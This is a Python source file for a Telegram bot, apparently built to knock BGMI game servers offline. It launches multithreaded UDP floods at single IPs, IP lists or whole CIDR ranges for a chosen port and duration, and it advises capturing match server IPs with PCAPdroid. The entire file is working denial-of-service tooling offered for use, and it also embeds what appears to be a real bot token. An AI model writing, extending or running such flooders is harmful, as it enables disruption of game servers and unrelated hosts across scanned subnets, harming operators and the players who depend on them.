# bot_bgmi_final.py - Multi-IP & CIDR attack for BGMI
import asyncio, threading, time, random, socket, re, os, ipaddress, requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

# ============ CONFIG ============
BOT_TOKEN = os.environ.get("BOT_TOKEN", "8278228198:AAG7C97c7R50_gsykoqBMwesCuoRZTciCLA")
ADMIN_IDS = [int(os.environ.get("ADMIN_ID", 8210011971))]

ATTACK_THREADS = 80
PACKET_SIZE = 512
DELAY = 0.0001

attack_active = False
attack_stats = {'packets': 0}
stats_lock = threading.Lock()
user_data = {}

# ============ MULTI-IP ATTACK ENGINE ============
def get_ips_from_target(target):
    """Convert CIDR or IP list to IP list"""
    if '/' in target:
        try:
            net = ipaddress.ip_network(target, strict=False)
            return [str(ip) for ip in net.hosts()]
        except:
            return [target]
    elif ',' in target:
        return [ip.strip() for ip in target.split(',')]
    else:
        return [target]

def udp_multi_ip_flood(ip_list, port, duration):
    global attack_active, attack_stats
    socks = []
    payload = random._urandom(PACKET_SIZE)
    
    for ip in ip_list:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            socks.append((s, ip))
        except:
            pass
    
    end = time.time() + duration
    while attack_active and time.time() < end:
        for sock, ip in socks:
            try:
                sock.sendto(payload, (ip, port))
                with stats_lock:
                    attack_stats['packets'] += 1
            except:
                pass
        time.sleep(DELAY)
    
    for sock, _ in socks:
        sock.close()

def launch_multi_attack(target_input, port, duration, method, update_cb):
    global attack_active, attack_stats
    
    ip_list = get_ips_from_target(target_input)
    attack_active = True
    with stats_lock:
        attack_stats = {'packets': 0, 'target_count': len(ip_list)}
    
    # Start threads (each thread attacks ALL IPs)
    threads = []
    for _ in range(ATTACK_THREADS):
        t = threading.Thread(target=udp_multi_ip_flood, args=(ip_list, port, duration), daemon=True)
        t.start()
        threads.append(t)
    
    start = time.time()
    while attack_active and (time.time() - start) < duration:
        time.sleep(2)
        elapsed = int(time.time() - start)
        with stats_lock:
            pkt = attack_stats['packets']
        speed = int(pkt / elapsed) if elapsed else 0
        bar = "█" * int(20 * elapsed / duration) + "░" * (20 - int(20 * elapsed / duration))
        update_cb(
            f"💥 *MULTI-IP ATTACK* 💥\n\n"
            f"🎯 `{target_input}:{port}`\n"
            f"📌 IPs attacked: `{len(ip_list)}`\n"
            f"📦 Packets: `{pkt:,}`\n"
            f"💥 Speed: `{speed:,}` pps\n"
            f"📊 `[{bar}]`\n"
            f"🧵 Threads: `{ATTACK_THREADS}`"
        )
    
    attack_active = False
    for t in threads:
        t.join(0.5)
    update_cb(f"✅ Attack completed on {len(ip_list)} IPs. Packets: {pkt:,}")

# ============ TELEGRAM ============
async def start(update, context):
    uid = update.effective_user.id
    if uid not in ADMIN_IDS:
        await update.message.reply_text("❌ Unauthorized")
        return
    user_data[uid] = {'step': 'target'}
    await update.message.reply_text(
        "🔥 *BGMI Server Flooder* 🔥\n\n"
        "Send *target IPs* (any format):\n"
        "- Single IP: `34.120.10.45`\n"
        "- CIDR: `34.120.10.0/24` (256 IPs)\n"
        "- Multiple: `1.1.1.1,2.2.2.2,3.3.3.3`\n\n"
        "🎮 *For BGMI*: Capture match IPs using PCAPdroid first!",
        parse_mode='Markdown'
    )

async def handle(update, context):
    uid = update.effective_user.id
    if uid not in ADMIN_IDS:
        return
    text = update.message.text.strip()
    step = user_data.get(uid, {}).get('step')
    
    if step == 'target':
        user_data[uid] = {'target': text, 'step': 'port'}
        await update.message.reply_text("🔌 Send *port* (1-65535):", parse_mode='Markdown')
    elif step == 'port':
        try:
            port = int(text)
            if port < 1 or port > 65535:
                raise ValueError
            user_data[uid]['port'] = port
            user_data[uid]['step'] = 'duration'
            await update.message.reply_text("⏱️ Send *duration* (5-300 seconds):", parse_mode='Markdown')
        except:
            await update.message.reply_text("Invalid port. Send again:")
    elif step == 'duration':
        try:
            duration = int(text)
            if duration < 5 or duration > 300:
                raise ValueError
            target = user_data[uid]['target']
            port = user_data[uid]['port']
            del user_data[uid]
            kb = [[InlineKeyboardButton("✅ START FLOOD", callback_data=f"flood_{target}_{port}_{duration}")],
                  [InlineKeyboardButton("❌ Cancel", callback_data="cancel")]]
            await update.message.reply_text(
                f"🔥 *Confirm Flood*\n\n🎯 `{target}:{port}`\n⏱️ `{duration}s`\n\nStart?",
                parse_mode='Markdown',
                reply_markup=InlineKeyboardMarkup(kb)
            )
        except:
            await update.message.reply_text("Invalid duration. Send again:")

async def button(update, context):
    query = update.callback_query
    await query.answer()
    data = query.data
    if data == "cancel":
        if query.from_user.id in user_data:
            del user_data[query.from_user.id]
        await query.edit_message_text("Cancelled")
        return
    if data.startswith("flood_"):
        _, target, port, duration = data.split("_")
        port = int(port)
        duration = int(duration)
        await query.edit_message_text(f"🚀 Flooding {target}:{port} for {duration}s...")
        loop = asyncio.get_event_loop()
        def send_update(msg):
            asyncio.run_coroutine_threadsafe(query.message.reply_text(msg, parse_mode='Markdown'), loop)
        threading.Thread(target=launch_multi_attack, args=(target, port, duration, "udp", send_update), daemon=True).start()

async def stop(update, context):
    global attack_active
    attack_active = False
    await update.message.reply_text("🛑 Flood stopped")

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("stop", stop))
    app.add_handler(CallbackQueryHandler(button))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle))
    print("✅ BGMI Flooder LIVE")
    app.run_polling()

if __name__ == "__main__":
    main()
